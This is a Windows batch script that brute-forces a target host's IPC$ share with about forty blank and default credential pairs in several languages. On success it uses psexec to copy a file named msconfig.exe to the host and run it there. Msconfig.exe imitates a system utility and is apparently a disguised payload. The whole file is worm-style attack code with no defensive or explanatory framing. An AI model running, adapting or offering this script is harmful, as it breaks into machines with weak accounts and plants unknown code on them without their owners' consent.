@echo off
net use \\%1\ipc$ "" /user:sa
if not errorlevel 1 goto sa
net use \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto blkad
net use \\%1\ipc$ "" /user:amministratore
if not errorlevel 1 goto amministratore
net use \\%1\ipc$ "" /user:forsterkning
if not errorlevel 1 goto forsterkning
net use \\%1\ipc$ "" /user:Verwalter
if not errorlevel 1 goto Verwalter
net use \\%1\ipc$ "" /user:user
if not errorlevel 1 goto userblank
net use \\%1\ipc$ "" /user:administrador
if not errorlevel 1 goto spanishadmin
net use \\%1\ipc$ "administrador" /user:administrador
if not errorlevel 1 goto spanishadmin2
net use \\%1\ipc$ "default" /user:default
if not errorlevel 1 goto defdef
net use \\%1\ipc$ "default" /user:user
if not errorlevel 1 goto defpass
net use \\%1\ipc$ "user" /user:default
if not errorlevel 1 goto userdef
net use \\%1\ipc$ "user" /user:user
if not errorlevel 1 goto useruser
net use \\%1\ipc$ "12345" /user:administrator
if not errorlevel 1 goto administrator12345
net use \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto administratorpassword
net use \\%1\ipc$ "1234" /user:administrator
if not errorlevel 1 goto administrator1234
net use \\%1\ipc$ "123" /user:administrator
if not errorlevel 1 goto administrator123
net use \\%1\ipc$ "123456" /user:administrator
if not errorlevel 1 goto administrator123456
net use \\%1\ipc$ "administrator" /user:admin
if not errorlevel 1 goto adminadministrator
net use \\%1\ipc$ "" /user:admin
if not errorlevel 1 goto adminblank
net use \\%1\ipc$ "guest" /user:guest
if not errorlevel 1 goto guestguest
net use \\%1\ipc$ "" /user:Administrateur
if not errorlevel 1 goto Administrateur
net use \\%1\ipc$ "Administrateur" /user:Administrateur
if not errorlevel 1 goto Administrateurx2
net use \\%1\ipc$ "student" /user:student
if not errorlevel 1 goto student
net use \\%1\ipc$ "" /user:Invité
if not errorlevel 1 goto Invité
net use \\%1\ipc$ "" /user:uzivatel
if not errorlevel 1 goto uzivatel
net use \\%1\ipc$ "administrator" /user:administrator
if not errorlevel 1 goto adad
net use \\%1\ipc$ "test" /user:administrator
if not errorlevel 1 goto adtest
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
net use \\%1\ipc$ "test123" /user:administrator
if not errorlevel 1 goto adtestt
net use \\%1\ipc$ "temp" /user:administrator
if not errorlevel 1 goto adtemp
net use \\%1\ipc$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp
net use \\%1\ipc$ "pass" /user:administrator
if not errorlevel 1 goto adpass
net use \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto adpassw
net use \\%1\ipc$ "admin" /user:administrator
if not errorlevel 1 goto adadmin
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot
net use \\%1\ipc$ "changeme" /user:administrator
if not errorlevel 1 goto adminch
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad
net use \\%1\ipc$ "" /user:MERUSER
if not errorlevel 1 goto meruser
net use \\%1\ipc$ "" /user:Extension
if not errorlevel 1 goto Extension
goto end
:Extension
psexec \\%1 -u Extension -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u Extension -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u Extension -p "" -d msconfig.exe -o
goto end
:meruser
psexec \\%1 -u MERUSER -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u MERUSER -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u MERUSER -p "" -d msconfig.exe -o
goto end
:userblank
psexec \\%1 -u user -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u user -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u user -p "" -d msconfig.exe -o
goto end
:defdef
psexec \\%1 -u default -p "default" -d attrib.exe -r msconfig.exe
psexec \\%1 -u default -p "default" -f -c -d msconfig.exe -o
psexec \\%1 -u default -p "default" -d msconfig.exe -o
goto end
:defpass
psexec \\%1 -u user -p "default" -d attrib.exe -r msconfig.exe
psexec \\%1 -u user -p "default" -f -c -d msconfig.exe -o
psexec \\%1 -u user -p "default" -d msconfig.exe -o
goto end
:userdef
psexec \\%1 -u default -p "user" -d attrib.exe -r msconfig.exe
psexec \\%1 -u default -p "user" -f -c -d msconfig.exe -o
psexec \\%1 -u default -p "user" -d msconfig.exe -o
goto end
:useruser
psexec \\%1 -u user -p "user" -d attrib.exe -r msconfig.exe
psexec \\%1 -u user -p "user" -f -c -d msconfig.exe -o
psexec \\%1 -u user -p "user" -d msconfig.exe -o
goto end
:administrator12345
psexec \\%1 -u administrator -p "12345" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "12345" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "12345" -d msconfig.exe -o
goto end
:administratorpassword
psexec \\%1 -u administrator -p "password" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "password" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "password" -d msconfig.exe -o
goto end
:administrator1234
psexec \\%1 -u administrator -p "1234" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "1234" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "1234" -d msconfig.exe -o
goto end
:administrator123
psexec \\%1 -u administrator -p "123" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "123" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "123" -d msconfig.exe -o
goto end
:administrator123456
psexec \\%1 -u administrator -p "123456" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "123456" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "123456" -d msconfig.exe -o
goto end
:adminadministrator
psexec \\%1 -u admin -p "administrator" -d attrib.exe -r msconfig.exe
psexec \\%1 -u admin -p "administrator" -f -c -d msconfig.exe -o
psexec \\%1 -u admin -p "administrator" -d msconfig.exe -o
goto end
:adminblank
psexec \\%1 -u admin -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u admin -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u admin -p "" -d msconfig.exe -o
goto end
:sa
psexec \\%1 -u sa -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u sa -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u sa -p "" -d msconfig.exe -o
goto end
:guestguest
psexec \\%1 -u guest -p "guest" -d attrib.exe -r msconfig.exe
psexec \\%1 -u guest -p "guest" -f -c -d msconfig.exe -o
psexec \\%1 -u guest -p "guest" -d msconfig.exe -o
goto end
:Administrateur
psexec \\%1 -u Administrateur -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u Administrateur -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u Administrateur -p "" -d msconfig.exe -o
goto end
:Administrateurx2
psexec \\%1 -u Administrateur -p "Administrateur" -d attrib.exe -r msconfig.exe
psexec \\%1 -u Administrateur -p "Administrateur" -f -c -d msconfig.exe -o
psexec \\%1 -u Administrateur -p "Administrateur" -d msconfig.exe -o
goto end
:student
psexec \\%1 -u student -p "student" -d attrib.exe -r msconfig.exe
psexec \\%1 -u student -p "student" -f -c -d msconfig.exe -o
psexec \\%1 -u student -p "student" -d msconfig.exe -o
goto end
:Invité
psexec \\%1 -u Invité -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u Invité -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u Invité -p "" -d msconfig.exe -o
goto end
:amministratore
psexec \\%1 -u amministratore -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u amministratore -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u amministratore -p "" -d msconfig.exe -o
goto end
:uzivatel
psexec \\%1 -u uzivatel -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u uzivatel -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u uzivatel -p "" -d msconfig.exe -o
goto end
:blkad
psexec \\%1 -u administrator -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "" -d msconfig.exe -o
goto end
:adad
psexec \\%1 -u administrator -p "admin" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "admin" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "admin" -d msconfig.exe -o
goto end
:adadmin
psexec \\%1 -u administrator -p "administrator" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "administrator" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "administrator" -d msconfig.exe -o
goto end
:rootroot
psexec \\%1 -u root -p "root" -d attrib.exe -r msconfig.exe
psexec \\%1 -u root -p "root" -f -c -d msconfig.exe -o
psexec \\%1 -u root -p "root" -d msconfig.exe -o
goto end
:adminad
psexec \\%1 -u admin -p "admin" -d attrib.exe -r msconfig.exe
psexec \\%1 -u admin -p "admin" -f -c -d msconfig.exe -o
psexec \\%1 -u admin -p "admin" -d msconfig.exe -o
goto end
:adtest
psexec \\%1 -u administrator -p "test" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "test" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "test" -d msconfig.exe -o
goto end
:forsterkning
psexec \\%1 -u forsterkning -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u forsterkning -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u forsterkning -p "" -d msconfig.exe -o
goto end
:testt
psexec \\%1 -u test -p "test" -d attrib.exe -r msconfig.exe
psexec \\%1 -u test -p "test" -f -c -d msconfig.exe -o
psexec \\%1 -u test -p "test" -d msconfig.exe -o
goto end
:adtestt
psexec \\%1 -u administrator -p "test123" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "test123" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "test123" -d msconfig.exe -o
goto end
:adtemp
psexec \\%1 -u administrator -p "temp" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "temp" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "temp" -d msconfig.exe -o
goto end
:adtempp
psexec \\%1 -u administrator -p "temp123" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "temp123" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "temp123" -d msconfig.exe -o
goto end
:adpass
psexec \\%1 -u administrator -p "pass" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "pass" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "pass" -d msconfig.exe -o
goto end
:adpassw
psexec \\%1 -u administrator -p "password" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "password" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "password" -d msconfig.exe -o
goto end
:adminch
psexec \\%1 -u administrator -p "changeme" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrator -p "changeme" -f -c -d msconfig.exe -o
psexec \\%1 -u administrator -p "changeme" -d msconfig.exe -o
goto end
:Verwalter
psexec \\%1 -u Verwalter -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u Verwalter -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u Verwalter -p "" -d msconfig.exe -o
goto end
:spanishadmin
psexec \\%1 -u administrador -p "" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrador -p "" -f -c -d msconfig.exe -o
psexec \\%1 -u administrador -p "" -d msconfig.exe -o
goto end
:spanishadmin2
psexec \\%1 -u administrador -p "administrador" -d attrib.exe -r msconfig.exe
psexec \\%1 -u administrador -p "administrador" -f -c -d msconfig.exe -o
psexec \\%1 -u administrador -p "administrador" -d msconfig.exe -o
goto end
:end